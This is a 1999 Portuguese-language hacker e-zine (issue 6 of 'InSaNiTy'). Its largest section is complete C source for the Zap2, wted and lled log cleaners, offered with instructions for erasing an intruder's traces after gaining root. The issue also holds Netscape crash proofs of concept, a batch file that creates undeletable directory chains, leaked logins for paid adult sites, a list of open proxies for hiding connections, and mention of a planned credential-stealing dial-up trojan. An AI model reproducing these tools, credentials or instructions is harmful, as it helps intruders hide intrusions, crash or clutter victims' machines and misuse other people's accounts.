edit /b insanity06.txt for a better view
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<    InSaNiTy    >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
///////////////////////////No-06-jUlh0/Ag0sT0/99\\\\\\\\\\\\\\\\\\\\\\\\\\\\
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
III  NN      NN  SSSSSSSSS    AAA    NN      NN  III  TTTTTTTT  YY      YY
III  NNN     NN  SS          AA AA   NNN     NN  III     TT      YY    YY
III  NN NN   NN  SS         AA   AA  NN NN   NN  III     TT       YY  YY
III  NN  NN  NN  SSSSSSSSS  AA   AA  NN  NN  NN  III     TT         YY
III  NN   NN NN  SSSSSSSSS  AAAAAAA  NN   NN NN  III     TT         YY
III  NN    NNNN         SS  AA   AA  NN    NNNN  III     TT         YY
III  NN     NNN  SSSSSSSSS  AA   AA  NN     NNN  III     TT         YY
              
            NAO CONFIE NA POLICIA, ELES SAO UMA RACA FILHA DA PUTA
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
                    ++++++++++++++++++++++++++++++++++++
+++++++++++++++++++ http://members.xoom.com/insanityzine +++++++++++++++++++
                    ++++++++++++++++++++++++++++++++++++ 


INDICE
******

01- CeLLular S3Cr3tS (N0ki4) .......................[dexter07]        
02- SiMpl3 iRc b0unc3 ..............................[dexter07]
03- Pr0jEcT5 .......................................[dexter07]
 03.1- crypt0
 03.2- LiSt3n3R
 03.3- ReStRiCt RuN 
04- Cl34n1nG l0g5 ..................................[[Thunder]]
05- c0NecTiviD4De d0s/WiN ..........................[dexter07]
06- N3T5c4P3 bUg5 ..................................[dexter07]
07- lAmeR d0 meS ...................................[MeMbErS]
08- XXX P455w0rd5 ..................................[dexter07]
09- b0nus ..........................................[dexter07]
10- h0mEp4gE sTaTs
11- MeMbeRs

OBS.:O autor(es) nao se responsabiliza por nada que voce venha a fazer 
depois de ler esse zine
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-

" Kill The Nazis
  Kill'em All
  Kill The Nazis
  Right Now "
(Total Chaos,'Kill the Nazis')

" Viva Zapata, Viva Chiapas
  Viva Mexico, Viva la revolucion"
(Brujeria,'Revolucion')

****************************
*1-CeLLular S3Cr3tS (N0ki4)*
****************************

Obs.: algumas coisas que voce vai ver aqui
ja sairam na zine phone9 mas nao eh copia
talvez a fonte seja a mesma,mas nao copiamos deles ok

Alguns segredinhos pra celulares nokia
na proxima edicao tem mais,nao sei que marca
vou por,mas deve ser motorola ou ericsson.

NOKIA 2110i
-----------

CODIGOS:
--------
Para ver o IMEI(International Mobile Equipment Identity) de seu celular
digite:
*#06# 

Para ver a semana e ano da producao de seu telefone:
*#3283#
a resposta vai ser: [*# D A T A #]
os 2 ultimos digitos sao o ano e os 2 primeiros a semana do ano

SOFTWARE:
--------
Para ver a versao do software no 2110e/2110i digite:
*#170602112302# ou *#9999# 
Nos mais novos o codigo foi trocado para:
*#682371158412125#

o telefone vai responder algo assim:

V 5.31

06-01-96

NHE-4

Primeira Linha:
Versao do software

obs:
Ultima versao: V. 5.70 (xx-xx-97) 

Segunda Linha:
Data do software

Terceira Linha:
NHE-4 tem algo a ver com o tipo de telefone que vc
esta usando.
Sera q eh GSM 900 (standard), GSM 1800 (DCS1800) 
ou GSM 1900 (PCS1900)? 
Os Nokias 2110, 3110, 8110(i) sao todos NHE. 
A unica coisa que varia eh o codigo depois do NHE- ("4").
O 5110 e o 6110 sao NSE-1 e NSE-3
Como atualizar o software dele?
O certo seria ir no revendedor nokia e pedir pra atualizarem
mas no Brasil sera q tem isso?

NOKIA 3110
----------

CODIGOS:
--------
#06# pra ver o IMEI ja falei la em cima 

*#7780# Restaurar as configs de fabrica (Memoria,lingua,etc.) 

*#92702689# O telfone responde 'warranty code:'
ai voce pode digitar:

6232 (OK) : Ver o ano e semana da fabricacao

7332 (OK) : Mostra a data da ultima assistencia tecnica.
Se nao houver ele responde('DATE NOT SAVED'...) 

7832 (OK) : Mostra a data da compra do celular.
Se nao for gravada ele responde('DATE NOT SAVED'...) 

9268 (OK) : Mostra o serial number 

37832 (OK) : Muda a data da compra no padrao MMAA 
Obs: voce so pode fazer isso uma vez.

SOFTWARE:
---------

*#3110# pra ver a versao do software

e ele vai mostra a mesma coisa q o 2110i,
que voce pode ler la em cima
mas pra adiantar as coisas tai os dados dele:

Tipo: NHE-8
Ultima Versao: V. 8.50 (20-10-98)
 
NOKIA 5110
----------

CODIGOS:
--------
*#06# pra ver o IMEI (veja la em cima o q eh)

*#92702689# O telfone responde 'warranty code:'
e voce pode por os seguintes codigos:

1: Mostra o serial number.
2: Mostra o mes e ano da fabricacao (MMAA) 
3: Mostra (se tiver gravado)a data da compra (MMAA)
   se nao tiver sido gravada,vc pode grava-la,mas nao faca merda
   porque so pode ser gravada uma vez
4: Mostra a data da ultima assistencia tecnic(se for gravada) 
6: Transfere TODOS numeros,figuras, e sons de um telefone pra outro
   mas tem que ter uns cabos especiais la de transmissao.

SOFTWARE:
---------
*#0000# - pra mostrar a versao do software
e ele vai mostra a mesma coisa q os outros la de cima,
mas pra adiantar as coisas tai os dados dele:

Tipo: NSE-1
Ultima versao: V. 5.11 (18-02-99)

SAIDAS:
-------
       1 2 3 4 5 6  
       | | | | | | 
(o) | | [= = = = = =] | |
 | | |
 7 8 9     

1 - VIN CHARGER INPUT VOLTAGE 8.4V 0.8A (entrada de carregador)
2 - CHRG CTRL CHARGER CONTROL PWM 32Khz (controle do carregador)
3 - XMIC MIC INPUT 60mV - 1V  (entrada pra microfone)
4 - SGND SIGNAL GROUND (????????)
5 - XEAR EAR OUTPUT 80mV - 1V (saida pra fone de ouvido) 
6 - MBUS 9600 B/S  (saida e entrada pra dados)
7 - FBUS_RX 9.6 - 230.4 KB/S (saida e entrada pra dados)
8 - FBUS_TX 9.6 - 230.4 KB/S (saida e entrada pra dados)
9 - L_GND CHARGER / LOGIC GND (carregador)

NOKIA 6110
----------

CODIGOS:
--------
Iguais ao 5110

SOFTWARE:
---------
*#0000# - pra mostrar a versao do software
e ele vai mostra a mesma coisa q os outros la de cima,
mas pra adiantar as coisas tai os dados dele:

Tipo: NSE-3
Ultima versao: V 05.31 (18-02-99)

SAIDAS:
-------
Iguais ao 5110

TIPS:
-----
Reb00t

1-Va no calendario (menu 8)

2-Faca uma anotacao(note/reminder)

3-Digite alguma coisa na edit box

4-segure o clear ate o texto apagar inteiro

5-Aperte o 0 (zero).A tela proncipal vai ser mostrada mas 
  aparece um espaco na tela.Voce vai ve-la ofuscando

6-Digite 4 digitos (tipo 1234)

7-Use a seta pra baixo e mova o cursor para o lado esquerdo 
  dos numeros q digitou e de espaco (2 vezes na seta pra baixo)

8-ta quase no fim ja. Agora digite 6 digitos e aperte a tecla
  verde "call button"

9-Espere alguns segundos .. vai piscar a luz do background dele
  e reb00ta.

obs: ouvi dizer q funcia em todas versoes de software dele.
     mas so testei na versao V. 4.73 (22-04-98)

*********************
*2-SiMpl3 iRc b0unc3*
*********************

Vo facilita as coisas
nao vo entra em nada mto tecnico
soh vo explica pra q serve bounce.
Bounce nada mais eh do que um spoof 
voce pode bouncear a sua conexao no irc
de varias formas,vou explicar a forma por socks server
Socks server eh tipo um proxy,tambem eh chamado por alguns
de firewall,mas nomes a parte o que o socks faz eh
um servico de proxy e firewall junto,e pra nao esquecer,roda
na porta 1080 e sua conexao com o irc fica assim:

USUARIO DE IRC  ---  SOCKS SERVER  ---  SERVIDOR DE IRC
   
ou seja voce conecta no socks e depois no irc,fazendo assim
um barreira entre vc e os outros usuarios,se os nukadores
de plantao por ai tentarem te nukar,vao estar nukando o
socks server na verdade.

E como faz pra configurar isso:

Eu vo explica como faz isso em winblows
no mirc ,e na sessao bonus,varios socks server
"gratuitos pra voce usar".

clica no setup info, o segundo botao la
e vai na folha firewall.
checa a caixa use socks firewall
ai vai ter o host do socks o username e password e a porta
e o metodo,se eh socks 4 ou 5.
vc poe no campo de host o socks "gratuito" que voce pode achar
por ai,pegando um scan e scaneando a porta 1080.
eu recomendo o proxy hunter.
no username e password vc poe o username e password,se tiver
pq alguns nao precisam
e a porta, que geralmente eh 1080
o metodo vc poe primeiro o socks 5
se der method invalid na janela de status
eh pq o firewall nao aceita socks5 entao tente o 4
algumas vezes vai conectar e dizer q o firewall fechou
a conexao e tal,as vezes isso eh causado por ele estar sendo
muito usado,tente outro host.
 
************
*3-PROJECT5*
************

Se voce ja foi na nossa pagina em julho ou agosto
e foi na parte de download,ja deve ter visto os programas
crypto,restrict run e listener.
Vo so da uma explicadinha neles pra vc.


3.1-crypt0
**********
Um simples encriptador/descriptador de textos
pros admins bundoes nao lerem seu email,
na proxima versao talvez coloque pra voce escolher
um arquivo pra encriptar,mas no futuro,pq agora
nao estou com muito tempo pra isso.

3.2-LiSt3n3R
************
Otro programinha simples pra detectar os "hackers" que
tentarem invadir seu computador pelo
BO(31337),netbus(12345),wingate(pela porta de socks(1080)),e pelo
compartilhamento do winblows (139).
Ele vai te dar o ip do cara q tento e vai faze um log em
c:\windows\attack.log

3.3-ReStRiCt RuN 
****************
Esse eh o mais "complexo" dos 3 mas nada de mais.
Ele simplesmente vai travar todos os arquivos executaveis do
computador atraves do registro.
voce pode escolher uma senha pra travar/destravar.
a primeira vez que voce usa nao tem senha.
entao mude logo na primeira vez q usar.

E breve na sessao de projects da insanity zine tb
uma especie de "trojan" que vai imitar a dial-up
do windows e salvar as informacoes do usuario num arquivo.
Breve na nossa pagina.

*****************
*4-Cl34n1nG l0g5*
*****************

Bom, chegamos a uma das partes mais importantes de tudo, que eh nao ficar
nos logs, pois la esta a prova q vc esteve fazendo o que fez, portanto, a
sua verdadeira missao eh entrar em um sistema e permanecer invisivel!
Sejao mais cauteloso possivel, trace planos, pense muito antes no que vc vai
fazer, nao deixar tracos devera ser facil.
Eu colocarei aki, os codigos dos melhores cleaners que exitem por ae,
portanto, fike fora dos logs se nao quiser ser pego!!!

4.1-L0g f1L3s
*************

Vc deve ter na sua corrente sanguinea, que os arquivos que ficam com os
log sao o wtmp, utmp, e o lastlog, e todos se localizam no /var/log ,
/var/adm ou ate mesmo no /etc dependendo o tipo do sistema.

**Zap2**

Eu irei botar aki o cleaner mais conhecido o Zap2 e antes de compilar ele
vc tem que adaptar ele para o sistema que vc o aplicara, olhe essas
linhas:

#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/usr/adm/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

Aki elas estao setadas para um tipo de sistema, encontre onde os arquivos
se localizam no sistema e mude no script antes de compilar.

+++++++++++++++++++++++++++++++CORTE AKI++++++++++++++++++++++++++++++++++
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/usr/adm/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"

int f;

void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;

  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}

void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;

    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {

     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}

void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;

     if ((pwd=getpwnam(who))!=NULL) {

        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }

    } else printf("%s: ?\n",who);
}

main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}

+++++++++++++++++++++++++++++++CORTE AKI++++++++++++++++++++++++++++++++++

Compile esse codigo normalmente, o seu uso eh simples, um vez que vc tem
root:

bash# z2 thunder
Zap!
bash#

Pronto, aki eu apaguei a presenca do usuario thunder dos logs, mas tome
cuidado que o zap ainda deixa tracos. 
Digamos que vc logue denovo no sistema, depois q vc ja usou o zap, o
melhor seria usar esses dois scripts:

**wted**

Esse prog tira completamente o user do wtmp e utmp files, ja que o zap
deixa alguns rastros, use-o com a opcao -x para tirar as remocoes do zap,
e -e username para tirar um user do wtmp e utmp. Exitem outras opcoes tb,
compile e veja(veja a opcao de tirar um ip/host(BOM!))

++++++++++++++++++++++++++++++CORTA+++++++++++++++++++++++++++++++++

#include <stdio.h>
#include <utmp.h>
#include <time.h>
#include <fcntl.h>

char *file="/var/adm/wtmp";

main(argc,argv)
int argc;
char *argv[];
{
int i;
if (argc==1) usage();
for(i=1;i<argc;i++)
        {
        if(argv[i][0] == '-')
                {
                switch(argv[i][1])
                        {
                        case 'b': printents(""); break;
                        case 'z': printents("Z4p"); break;
                        case 'e': erase(argv[i+1],0); break;
                        case 'c': erase(0,argv[i+1]); break;
                        case 'f': file=argv[i+1]; break;
                        case 'u': printents(argv[i+1]); break;
                        case 'a': printents("*"); break;
                        case 'x': remnull(argv[i+1]); break;
                        default:usage();
                        }
                }
        }
}

printents(name)
char *name;
{
struct utmp utmp,*ptr;
int fp=-1;
ptr=&utmp;
if (fp=open(file,O_RDONLY))
        {
        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp))
                {
                if ( !(strcmp(name,ptr->ut_name)) || (name=="*") ||
                (!(strcmp("Z4p",name)) && (ptr->ut_time==0)))
                        printinfo(ptr);
                }
        close(fp);
        }
}

printinfo(ptr)
struct utmp *ptr;
{
char tmpstr[256];
printf("%s\t",ptr->ut_name);
printf("%s\t",ptr->ut_line);
strcpy(tmpstr,ctime(&(ptr->ut_time)));
tmpstr[strlen(tmpstr)-1]='\0';
printf("%s\t",tmpstr);
printf("%s\n",ptr->ut_host);
}

erase(name,host)
char *name,*host;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct utmp utmp;
unsigned char c;
if (fp=open(file,O_RDONLY)) {
        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
                if (host)
                        if (strstr(utmp.ut_host,host)) tot++;
                        else {cnt++;write(fd,&utmp,sizeof(struct utmp));}
                if (name) {
                if (strcmp(utmp.ut_name,name)) {cnt++;
                        write(fd,&utmp,sizeof(struct utmp));}
                else {
                        if (n>0) {
                                n--;cnt++;
                                write(fd,&utmp,sizeof(struct utmp));}
                        else
                        {
                        printinfo(&utmp);
                        printf("Erase entry (y/n/f(astforward))? ");
                        c='a';
                        while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
                        if (c=='f') {
                                cnt++;
                                write(fd,&utmp,sizeof(struct utmp));
                                printf("Fast forward how many entries? ");
                                scanf("%d",&n);}
                        if (c=='n') {
                                cnt++;
                                write(fd,&utmp,sizeof(struct utmp));
                                }
                        if (c=='y') tot++;
                        }
                      } }
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
}

remnull(name)
char *name;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct utmp utmp;
if (fp=open(file,O_RDONLY)) {
        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
                if (utmp.ut_time) {
                        cnt++;
                        write(fd,&utmp,sizeof(struct utmp));
                }
                else
                        tot++;
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
}

usage()
{
printf("Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c
HOST\n");
printf("\t-h\tThis help\n");
printf("\t-f\tUse FILE instead of default\n");
printf("\t-a\tShow all entries found\n");
printf("\t-u\tShow all entries for USER\n");
printf("\t-b\tShow NULL entries\n");
printf("\t-e\tErase USER completely\n");
printf("\t-c\tErase all connections containing HOST\n");
printf("\t-z\tShow ZAP'd entries\n");
printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
}

++++++++++++++++++++++++++++CORTA++++++++++++++++++++++++++++++++++

Sobra ter q limpar as remocoes do zap no lastlog, e isso sera feito com o
lled.

**lled**

Soh fiz esse topico pra nao ficar faltando, ele funfa como o outro , soh
que limpa o lastlog, compile normal e pah...

+++++++++++++++++++++++++++++++++CORTA+++++++++++++++++++++++++++++++++

#include <stdio.h>
#include <time.h>
#include <lastlog.h>
#include <fcntl.h>

char *file="/var/adm/lastlog";

main(argc,argv)
int argc;
char *argv[];
{
int i;
if (argc==1) usage();
for(i=1;i<argc;i++)
        {
        if(argv[i][0] == '-')
                {
                switch(argv[i][1])
                        {
                        case 'b': printents(""); break;
                        case 'z': printents("Z4p"); break;
                        case 'e': erase(argv[i+1]); break;
                        case 'c': erase(0,argv[i+1]); break;
                        case 'f': file=argv[i+1]; break;
                        case 'u': printents(argv[i+1]); break;
                        case 'a': printents("*"); break;
                        case 'x': remnull(argv[i+1]); break;
                        default:usage();
                        }
                }
        }
}

printents(name)
char *name;
{
struct lastlog utmp,*ptr;
int fp=-1;
ptr=&utmp;
if (fp=open(file,O_RDONLY))
        {
        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct
lastlog))
                {
                if ( !(strcmp(name,ptr->ll_line)) || (name=="*") ||
                (!(strcmp("Z4p",name)) && (ptr->ll_time==0)))
                        printinfo(ptr);
                }
        close(fp);
        }
}

printinfo(ptr)
struct lastlog *ptr;
{
char tmpstr[256];
printf("%s\t",ptr->ll_line);
strcpy(tmpstr,ctime(&(ptr->ll_time)));
tmpstr[strlen(tmpstr)-1]='\0';
printf("%s\t",tmpstr);
printf("%s\n",ptr->ll_host);
}

erase(name,host)
char *name,*host;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct lastlog utmp;
unsigned char c;
if (fp=open(file,O_RDONLY)) {
        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct
lastlog)) {
                if (host)
                        if (strstr(utmp.ll_host,host)) tot++;
                        else {cnt++;write(fd,&utmp,sizeof(struct
lastlog));}
                if (name) {
                if (strcmp(utmp.ll_line,name)) {cnt++;
                        write(fd,&utmp,sizeof(struct lastlog));}
                else {
                        if (n>0) {
                                n--;cnt++;
                                write(fd,&utmp,sizeof(struct lastlog));}
                        else
                        {
                        printinfo(&utmp);
                        printf("Erase entry (y/n/f(astforward))? ");
                        c='a';
                        while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
                        if (c=='f') {
                                cnt++;
                                write(fd,&utmp,sizeof(struct lastlog));
                                printf("Fast forward how many entries? ");
                                scanf("%d",&n);}
                        if (c=='n') {
                                cnt++;
                                write(fd,&utmp,sizeof(struct lastlog));
                                }
                        if (c=='y') tot++;
                        }
                      } }
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
}


remnull(name)
char *name;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct lastlog utmp;
if (fp=open(file,O_RDONLY)) {
        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct
lastlog)) {
                if (utmp.ll_time) {
                        cnt++;
                        write(fd,&utmp,sizeof(struct lastlog));
                }
                else
                        tot++;
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
}

usage()
{
printf("Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c
HOST\n");
printf("\t-h\tThis help\n");
printf("\t-f\tUse FILE instead of default\n");
printf("\t-a\tShow all entries found\n");
printf("\t-u\tShow all entries for USER\n");
printf("\t-b\tShow NULL entries\n");
printf("\t-e\tErase USER completely\n");
printf("\t-c\tErase all connections containing HOST\n");
printf("\t-z\tShow ZAP'd entries\n");
printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
}

++++++++++++++++++++++++++++CORTA++++++++++++++++++++++++++++++++++++++

Acho q com isso eu termino a secao de limpeza de logs, mas antes de acabar
totalmente eh bom sempre vc fazer isso:

bash# cd /var/adm
bash# grep username * |more
bash# grep ip * |more

esse comando grep ira te mostrar em que arquivos contem o username que vc
entrou e o seu ip, entao, se alguma coisa tiver passado pelo zap e pelos
outros vc apaga eles manualmente! 

*************************
*5-c0NecTiviD4De d0s/WiN*
*************************

Essa materia mostra bem a conectividade entre os dois
sistemas da nossa querida micro$oft

DIRETORIOS do Dos e windows

Ha alguns diretorios que voce pode criar com o comando
md pelo dos ou mesmo pelo prompt e o windows nao os 
reconhece e vc nao pode deleta-los.
sao eles (em AsCii):

254 - 213 - 217 
987 - 986 - 963 
961 - 962 - 960 
965 - 964 - 968 
969 - 988 - 991

Pra criar:
md ALT+numero na tabela ascii

So pra voce entender,voce poder por o que quiser dentro 
desses diretorios,que pelo windows nao serao reconhecidos,
Tanto pelo explorer como pelo gerenciador de arquivos.
O nome dos diretorios vai ficar como "_"

se voce tentar acessar vai dar:
A pasta 'X:\_' nao existe.

se tentar deletar,renomear,recortar ou colar:
Nao eh possivel excluir _:Nao eh possivel encontrar o arquivo especificado
Certifique-se que o caminho e o nome do arquivo tenham sido especificados
corretamente.  

Como fazer um .bat que criara varios diretorios inacessiveis pelo win

----dirs.bat----
@echo off
:1
md þ (no caso eh o alt+254)
cd þ
goto 1
:end
----dir.bat----

e vc ainda pode incrementar o .bat ae
pode por assim o md:
md (caractere).(caractere)
o cara dae vai ter q descobrir 2 caracteres,ficando mais dificil ainda.
explicando o dirs.bat:
ele vai criar o diretorio e entrar no diretorio criado
e vai ficar rodando ateh nao dar mais pra criar diretorios,que no dos
eu nao sei muito bem qtos sao ,ai vai comecar a dizer erro 
criando diretorio nao sei o q la vc da um ctrl+c e cancela e pronto
e depois nao adianta dar um deltree /y þ que nao vai adiantar
tem q ir pelo scandisk do winblows e escolher pra nao corrigir erros
automaticamente.

Isso sim eh conectividade.

*****************
*6-N3T5c4P3 bUg5*
*****************

6.1 - JavaScript crash
6.2 - internal/parser

*****
*6.1*
*****

o simples html:
-----
<html>
<table>
<td width="1"style=width:1>
<div style=width:1>1
<script>document.write
('<div style=width:1>')
</script>
</table>
</html>
-------
faz o seguinte:
--------------------------------------------------
NETSCAPE causou uma falha de página inválida no
módulo NETSCAPE.EXE em 0217:004090e7.
Registradores:
EAX=008ff8e4 CS=0217 EIP=004090e7 EFLGS=00010206
EBX=00ab5c00 SS=021f ESP=008ff8d8 EBP=008ff9e0
ECX=00ab5720 DS=021f ESI=00ab24f0 FS=2c7f
EDX=00ab54e0 ES=021f EDI=00000000 GS=0000
Bytes em CS:EIP:
0f bf 47 54 8b 4f 4c 03 45 ec 03 c1 89 45 b8 8b 
Esvaziamento da pilha:
00ab25fc 00ab24f0 00ab5741 004cdd28 004cdd33 00000a7e 
00973d00 00a9e510 00973d00 00973d00 00ab3840 008ff998 
008ff99c 00405e98 00ab24f0 008ff988 
--------------------------------------------------

Funciona em:
- Netscape Communicator 4.08
- Netscape Communicator 4.5
- Netscape Communicator 4.51
- Netscape Communicator 4.6
- Netscape Communicator 4.61

Nas seguintes plataformas: 
Windows 95
Windows 98
Windows NT 4
Windows 2000 (professional e Server)
MacOS
FreeBSD

Netscape 3.x nao eh vulneravel.

Como evitar:
desabilitando javascript

*****
*6.2*
*****

Netscape 4.x "internal/parser" bug

o CGI :
----------------
#!/bin/sh
echo Content-type: internal/parser
echo
echo seu br0wser nao eh afetado
echo use o botao Back pra voltar a pagina anterior.
----------------
poe um link ou roda direto
se nao funfar:
http://home.jtan.com/~jim/bugs/ns/parser-exploit.cgi

e da isso no netscape navigator 4.08:

------------------------------------------------------
NETSCAPE causou uma falha de página inválida no
módulo MSVCRT.DLL em 0217:78002ece.
Registradores:
EAX=00acafd0 CS=0217 EIP=78002ece EFLGS=00010246
EBX=00a9dec0 SS=021f ESP=008ff69c EBP=008ff730
ECX=0065e1f8 DS=021f ESI=00aca680 FS=0fb7
EDX=00000000 ES=021f EDI=00ac8510 GS=0000
Bytes em CS:EIP:
8b 02 3a 01 75 30 0a c0 74 29 3a 61 01 75 27 0a 
Esvaziamento da pilha:
00498f10 00000000 0065e1f8 00ac8510 00aca680 00000000 
00000000 00000000 008ff704 004a0c3d 00000000 00a20f80 
008ff704 00ac851c 00000000 008ff704 
-----------------------------------------------------

versoes afetadas:
da 4.04 ate a mais recente.
netscape pra macintosh parece nao ser afetada por ele.


****************
*7-lAmeR d0 meS*
****************
Escolhido 1: Marcos Machado
Escolhido 2: OverLord
Escolhido 3: Agent
Escolhido 4: ThE PeST 
Escolhido 5:

Nome: ThE PeST 

Porque foi escolhido: 
numa zine por ae que eu nao vo fala o nome
ele escreveu uma materia sobre como instala
o monkey linux 
olha o q ele escreveu:
"Como tenho visto muitas pessoas tem dificuldades de 
instalar o monkey linux,como eu ja tive... um dia! 
Sabendo disso resolvi explicar como se faz... 
Voces vao ver como e' simples"
e depois:
"Mes que vem tem como usar e instalar os pacotes do monkey..."
nao vo cita o nome da zine pra nao fica feio.
mas que essa foi foda foi

*****************
*8-XXX P455w0rd5*
*****************

URL: http://www.sexysite.com.br
Username: insanity
Password: zine

URL: http://www.babylon-x.com
Username: insanityzine 
Password: insanityzine

URL: http://www.hotsunshine.com/members/index.html
Username: forbidden
Password: rocks 

URL: http://www.cybergirlsex.com/members/
Username: jbar
Password: jbar1

URL: http://www.sexualeuphoria.com/members/index.html
Username: user9051
Password: 209a12

*********
*9-b0nus*
*********

como disse la em cima ,uma lista de alguns socks servers
"gratuitos".

endereco      porta
-------------------

ochina.com.ve 1080
interate.com.pe 1080
wingate.rosdev.ca 1080
tecnet.teccart.qc.ca 1080
dciserver.twfrierson.com 1080
mimu.msdj.com 1080
ns.elaso.cz 1080
aw2.archwaysales.com 1080
note.ark.ne.jp 1080
darwin.kma.lt 1080
zakproxy.alexcomm.net 1080
filter.miroi.se 1080
mail.coolmore.com.au 1080
ns.uss.br 1080
calnet1-7.gtecablemodem.com 1080
rcs.satimex.tvnet.hu 1080
dns.primedia.co.jp 1080
adsl-216-100-248-235.dsl.snfc21.pacbell.net 1080
hardwickgw.apex.net.au 1080
eta.riosoft.softex.br 1080

*******************
*10-h0mEp4gE sTaTs*
*******************

T0taL viSitS: 
476

D0MaIns:
Brasil (.BR)......41%
Unknown (.???)....25%
Networks (.NET)...12%
Commercial (.COM).6%
Dinamarca(.DK)....3%
Others............13%

Br0wSerS:
Exploder 4.X....42%
Netscape 4.X....36%
Exploder 5.X....16%
Netscape 3.X....1%
Exploder 3.X....1%
Others..........4%

obs.: exploder SUX

Os'S:
Windows 95....44%
Windows 98....42%
Windows NT....7%
misc Unix.....2%
Macintosh.....1%
Others........3%

obs.: misc Unix=(AIX,Linux,Unix,Irix,BSD's,etc..)

************   
*11-MeMbeRs*
************
aceita-se novos membros que saibam algo

4CTU4L M3MB3R5:

dexter07 (dexter07@bigfoot.com)
DuCkWaGe (duckwage@hotmail.com)

C0L4B0R4T0R5:

[Thunder] (thunder10@zipmail.com.br)

-------------------------------------------------------------------
-POR FAVOR, SE VOCE FOR COPIAR ALGUM TEXTO INSIRA A SEGUINTE LINHA-
-(INSANITY ZINE,EDICAO XX,AUTOR:XXXX)                             -
-------------------------------------------------------------------

                    ++++++++++++++++++++++++++++++++++++
+++++++++++++++++++ http://members.xoom.com/insanityzine +++++++++++++++++++
                    ++++++++++++++++++++++++++++++++++++ 

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

III  NN      NN  SSSSSSSSS    AAA    NN      NN  III  TTTTTTTT  YY      YY
III  NNN     NN  SS          AA AA   NNN     NN  III     TT      YY    YY
III  NN NN   NN  SS         AA   AA  NN NN   NN  III     TT       YY  YY
III  NN  NN  NN  SSSSSSSSS  AA   AA  NN  NN  NN  III     TT         YY
III  NN   NN NN  SSSSSSSSS  AAAAAAA  NN   NN NN  III     TT         YY
III  NN    NNNN         SS  AA   AA  NN    NNNN  III     TT         YY
